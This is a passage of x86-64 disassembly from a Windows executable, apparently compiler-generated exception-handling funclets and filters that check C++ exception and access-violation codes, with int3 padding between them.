   14000cad9:	48 83 ec 28          	sub    $0x28,%rsp
   14000cadd:	48 8b ea             	mov    %rdx,%rbp
   14000cae0:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   14000cae4:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   14000cae8:	80 7d 58 00          	cmpb   $0x0,0x58(%rbp)
   14000caec:	74 6c                	je     0x14000cb5a
   14000caee:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000caf2:	48 8b 08             	mov    (%rax),%rcx
   14000caf5:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000caf9:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000cafd:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000cb03:	75 55                	jne    0x14000cb5a
   14000cb05:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000cb09:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000cb0d:	75 4b                	jne    0x14000cb5a
   14000cb0f:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000cb13:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   14000cb1a:	74 1a                	je     0x14000cb36
   14000cb1c:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000cb20:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   14000cb27:	74 0d                	je     0x14000cb36
   14000cb29:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000cb2d:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   14000cb34:	75 24                	jne    0x14000cb5a
   14000cb36:	e8 11 62 ff ff       	call   0x140002d4c
   14000cb3b:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000cb3f:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000cb43:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000cb47:	48 8b 58 08          	mov    0x8(%rax),%rbx
   14000cb4b:	e8 fc 61 ff ff       	call   0x140002d4c
   14000cb50:	48 89 58 28          	mov    %rbx,0x28(%rax)
   14000cb54:	e8 47 83 ff ff       	call   0x140004ea0
   14000cb59:	90                   	nop
   14000cb5a:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   14000cb61:	8b 45 20             	mov    0x20(%rbp),%eax
   14000cb64:	48 83 c4 28          	add    $0x28,%rsp
   14000cb68:	5d                   	pop    %rbp
   14000cb69:	5b                   	pop    %rbx
   14000cb6a:	c3                   	ret
   14000cb6b:	cc                   	int3
   14000cb6c:	40 55                	rex push %rbp
   14000cb6e:	48 83 ec 20          	sub    $0x20,%rsp
   14000cb72:	48 8b ea             	mov    %rdx,%rbp
   14000cb75:	33 c9                	xor    %ecx,%ecx
   14000cb77:	48 83 c4 20          	add    $0x20,%rsp
   14000cb7b:	5d                   	pop    %rbp
   14000cb7c:	e9 fb 94 ff ff       	jmp    0x14000607c
   14000cb81:	cc                   	int3
   14000cb82:	40 55                	rex push %rbp
   14000cb84:	48 83 ec 20          	sub    $0x20,%rsp
   14000cb88:	48 8b ea             	mov    %rdx,%rbp
   14000cb8b:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000cb8f:	8b 08                	mov    (%rax),%ecx
   14000cb91:	48 83 c4 20          	add    $0x20,%rsp
   14000cb95:	5d                   	pop    %rbp
   14000cb96:	e9 e1 94 ff ff       	jmp    0x14000607c
   14000cb9b:	cc                   	int3
   14000cb9c:	40 55                	rex push %rbp
   14000cb9e:	48 83 ec 20          	sub    $0x20,%rsp
   14000cba2:	48 8b ea             	mov    %rdx,%rbp
   14000cba5:	48 8b 01             	mov    (%rcx),%rax
   14000cba8:	8b 08                	mov    (%rax),%ecx
   14000cbaa:	e8 e9 79 ff ff       	call   0x140004598
   14000cbaf:	90                   	nop
   14000cbb0:	48 83 c4 20          	add    $0x20,%rsp
   14000cbb4:	5d                   	pop    %rbp
   14000cbb5:	c3                   	ret
   14000cbb6:	cc                   	int3
   14000cbb7:	40 55                	rex push %rbp
   14000cbb9:	48 83 ec 20          	sub    $0x20,%rsp
   14000cbbd:	48 8b ea             	mov    %rdx,%rbp
   14000cbc0:	48 8b 45 58          	mov    0x58(%rbp),%rax
   14000cbc4:	8b 08                	mov    (%rax),%ecx
   14000cbc6:	48 83 c4 20          	add    $0x20,%rsp
   14000cbca:	5d                   	pop    %rbp
   14000cbcb:	e9 ac 94 ff ff       	jmp    0x14000607c
   14000cbd0:	cc                   	int3
   14000cbd1:	40 55                	rex push %rbp
   14000cbd3:	48 83 ec 20          	sub    $0x20,%rsp
   14000cbd7:	48 8b ea             	mov    %rdx,%rbp
   14000cbda:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000cbdf:	48 83 c4 20          	add    $0x20,%rsp
   14000cbe3:	5d                   	pop    %rbp
   14000cbe4:	e9 93 94 ff ff       	jmp    0x14000607c
   14000cbe9:	cc                   	int3
   14000cbea:	40 55                	rex push %rbp
   14000cbec:	48 83 ec 20          	sub    $0x20,%rsp
   14000cbf0:	48 8b ea             	mov    %rdx,%rbp
   14000cbf3:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000cbf8:	48 83 c4 20          	add    $0x20,%rsp
   14000cbfc:	5d                   	pop    %rbp
   14000cbfd:	e9 7a 94 ff ff       	jmp    0x14000607c
   14000cc02:	cc                   	int3
   14000cc03:	40 55                	rex push %rbp
   14000cc05:	48 83 ec 20          	sub    $0x20,%rsp
   14000cc09:	48 8b ea             	mov    %rdx,%rbp
   14000cc0c:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000cc11:	48 83 c4 20          	add    $0x20,%rsp
   14000cc15:	5d                   	pop    %rbp
   14000cc16:	e9 61 94 ff ff       	jmp    0x14000607c
   14000cc1b:	cc                   	int3
   14000cc1c:	40 55                	rex push %rbp
   14000cc1e:	48 83 ec 20          	sub    $0x20,%rsp
   14000cc22:	48 8b ea             	mov    %rdx,%rbp
   14000cc25:	80 7d 70 00          	cmpb   $0x0,0x70(%rbp)
   14000cc29:	74 0b                	je     0x14000cc36
   14000cc2b:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000cc30:	e8 47 94 ff ff       	call   0x14000607c
   14000cc35:	90                   	nop
   14000cc36:	48 83 c4 20          	add    $0x20,%rsp
   14000cc3a:	5d                   	pop    %rbp
   14000cc3b:	c3                   	ret
   14000cc3c:	cc                   	int3
   14000cc3d:	40 55                	rex push %rbp
   14000cc3f:	48 83 ec 20          	sub    $0x20,%rsp
   14000cc43:	48 8b ea             	mov    %rdx,%rbp
   14000cc46:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000cc4a:	48 8b 09             	mov    (%rcx),%rcx
   14000cc4d:	48 83 c4 20          	add    $0x20,%rsp
   14000cc51:	5d                   	pop    %rbp
   14000cc52:	e9 91 c5 ff ff       	jmp    0x1400091e8
   14000cc57:	cc                   	int3
   14000cc58:	40 55                	rex push %rbp
   14000cc5a:	48 83 ec 20          	sub    $0x20,%rsp
   14000cc5e:	48 8b ea             	mov    %rdx,%rbp
   14000cc61:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   14000cc68:	8b 08                	mov    (%rax),%ecx
   14000cc6a:	48 83 c4 20          	add    $0x20,%rsp
   14000cc6e:	5d                   	pop    %rbp
   14000cc6f:	e9 08 94 ff ff       	jmp    0x14000607c
   14000cc74:	cc                   	int3
   14000cc75:	40 55                	rex push %rbp
   14000cc77:	48 83 ec 20          	sub    $0x20,%rsp
   14000cc7b:	48 8b ea             	mov    %rdx,%rbp
   14000cc7e:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000cc82:	8b 08                	mov    (%rax),%ecx
   14000cc84:	48 83 c4 20          	add    $0x20,%rsp
   14000cc88:	5d                   	pop    %rbp
   14000cc89:	e9 42 b0 ff ff       	jmp    0x140007cd0
   14000cc8e:	cc                   	int3
   14000cc8f:	40 55                	rex push %rbp
   14000cc91:	48 83 ec 20          	sub    $0x20,%rsp
   14000cc95:	48 8b ea             	mov    %rdx,%rbp
   14000cc98:	8b 4d 50             	mov    0x50(%rbp),%ecx
   14000cc9b:	48 83 c4 20          	add    $0x20,%rsp
   14000cc9f:	5d                   	pop    %rbp
   14000cca0:	e9 2b b0 ff ff       	jmp    0x140007cd0
   14000cca5:	cc                   	int3
   14000cca6:	40 55                	rex push %rbp
   14000cca8:	48 83 ec 20          	sub    $0x20,%rsp
   14000ccac:	48 8b ea             	mov    %rdx,%rbp
   14000ccaf:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000ccb4:	48 83 c4 20          	add    $0x20,%rsp
   14000ccb8:	5d                   	pop    %rbp
   14000ccb9:	e9 be 93 ff ff       	jmp    0x14000607c
   14000ccbe:	cc                   	int3
   14000ccbf:	40 55                	rex push %rbp
   14000ccc1:	48 83 ec 20          	sub    $0x20,%rsp
   14000ccc5:	48 8b ea             	mov    %rdx,%rbp
   14000ccc8:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   14000cccc:	48 83 c4 20          	add    $0x20,%rsp
   14000ccd0:	5d                   	pop    %rbp
   14000ccd1:	e9 12 c5 ff ff       	jmp    0x1400091e8
   14000ccd6:	cc                   	int3
   14000ccd7:	40 55                	rex push %rbp
   14000ccd9:	48 83 ec 20          	sub    $0x20,%rsp
   14000ccdd:	48 8b ea             	mov    %rdx,%rbp
   14000cce0:	48 8b 01             	mov    (%rcx),%rax
   14000cce3:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000cce9:	74 0c                	je     0x14000ccf7
   14000cceb:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%rax)
   14000ccf1:	74 04                	je     0x14000ccf7
   14000ccf3:	33 c0                	xor    %eax,%eax
   14000ccf5:	eb 05                	jmp    0x14000ccfc
   14000ccf7:	b8 01 00 00 00       	mov    $0x1,%eax
   14000ccfc:	48 83 c4 20          	add    $0x20,%rsp
   14000cd00:	5d                   	pop    %rbp
   14000cd01:	c3                   	ret
   14000cd02:	cc                   	int3
   14000cd03:	cc                   	int3
   14000cd04:	cc                   	int3
   14000cd05:	cc                   	int3
   14000cd06:	cc                   	int3
   14000cd07:	cc                   	int3
   14000cd08:	cc                   	int3
   14000cd09:	cc                   	int3
   14000cd0a:	cc                   	int3
   14000cd0b:	cc                   	int3
   14000cd0c:	cc                   	int3
   14000cd0d:	cc                   	int3
   14000cd0e:	cc                   	int3
   14000cd0f:	cc                   	int3
   14000cd10:	40 55                	rex push %rbp
   14000cd12:	48 83 ec 20          	sub    $0x20,%rsp
   14000cd16:	48 8b ea             	mov    %rdx,%rbp
   14000cd19:	48 8b 01             	mov    (%rcx),%rax
   14000cd1c:	33 c9                	xor    %ecx,%ecx
   14000cd1e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000cd24:	0f 94 c1             	sete   %cl
   14000cd27:	8b c1                	mov    %ecx,%eax
   14000cd29:	48 83 c4 20          	add    $0x20,%rsp
   14000cd2d:	5d                   	pop    %rbp
   14000cd2e:	c3                   	ret
   14000cd2f:	cc                   	int3
